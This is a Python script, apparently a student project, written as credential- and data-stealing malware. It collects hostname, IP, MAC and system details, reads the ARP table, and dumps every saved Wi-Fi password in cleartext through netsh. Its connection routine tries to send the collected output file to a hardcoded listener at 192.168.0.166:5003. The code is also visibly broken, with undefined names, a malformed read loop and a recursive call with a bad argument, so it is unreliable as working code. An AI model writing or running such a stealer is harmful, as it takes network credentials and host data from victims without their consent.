from __future__ import print_function
from platform import system
from platform import processor
import platform
import socket
from getmac import get_mac_address as mac
from time import *
import os
import subprocess
import psutil
import sys
import uuid
import keyboard
import smtplib
from threading import Semaphore, Timer
import shutil



filename = "output.txt"
filesize = os.path.getsize(filename)



def connection():
    host_ip = '192.168.0.166'
    port = 5003
    buffer = 1024
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    connected = False
    while not connected:
        try:
            client.connect((host_ip, port))
            connected = True
            client.send(f"{filename}{SEPARATOR}{filesize}".encode())
            with open(filename, 'rb') as f:
                for _ in progress:
                    read_bytes = f.read(connection(buffer))
                if not read_bytes:
                    break
            client.sendall(read_bytes)
        except Exception as ex:
            pass

def user_collection(): #adam side collect hostname, ip, mac, system, and node
    print('Data collected regarding user.')
    host = socket.gethostname()
    address = socket.gethostbyname(host)
    mac_address = mac()
    sys = system()
    nd = processor()
    with open("output.txt", "a") as u:
        print ("Processor used by user is: ", nd, file=u)
        print("System used by user is: ", sys, file=u)
        print("Hostname of device is: ", host, file=u)
        print("Ipv4 Address is: ", address, file=u)
        print("MAC Address is: ", mac_address,file =u)

    

    
def network_collection(): # jeffrey side get arp table, netstat, wifi profile and wifi password, cpu usage and virtual mem
    print("Data collected regarding network" ,'\n')
    
    with os.popen('arp -a') as f:
        data = f.read()
        print("ARP Table stolen")
        print(data ,'\n')
        

    print('Wifi Profiles and Password' ,'\n')
    wifi = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles'], ).decode('utf-8', errors="backslashreplace",).split('\n')

    wifi_profiles = [i.split(":")[1][1:-1] for i in wifi if "All User Profile" in i]
    for i in wifi_profiles:
        try:
            results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode('utf-8', errors="backslashreplace").split('\n')
            results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
            try:
                print ("{:<30}|  {:<}".format(i, results[0]))
            except IndexError:
                print ("{:<30}|  {:<}".format(i, ""))
        except subprocess.CalledProcessError:
            print ("{:<30}|  {:<}".format(i, "ENCODING ERROR"))
    input("")

    print('CPU Usage is: ', psutil.cpu_percent())  #here outputs the cpu_percent

    print(psutil.virtual_memory())  # virtual memory usage 

    print('memory % used:', psutil.virtual_memory()[2]) #print the output for both of it


def computer_collection():
    with  open("computer_data.txt", "a") as c:
        print(f"Name: " +socket.gethostname(), file=c)
        print(f"FQDN: " +socket.getfqdn(), file=c)
        print(f"System Platform: "+sys.platform, file=c)
        print(f"Machine: " +platform.machine(), file=c)
        print(f"Node: " +platform.node(), file=c)
        print(f"Platform: "+platform.platform(), file=c)
        print(f"Pocessor: " +platform.processor(), file=c)
        print(f"System OS: "+platform.system(), file=c)
        print(f"Release: " +platform.release(), file=c)
        print(f"Version: " +platform.version(), file=c)



def menu():
    connection()    
    print("1. Display information collected" '\n' "2. Run the attacks" '\n' '3. Display Menu again')
    choice = input('Enter the following choice.')
    if choice == '1':
            user_collection()
            network_collection()
            computer_collection()
            menu()

def main ():
    menu()
main()
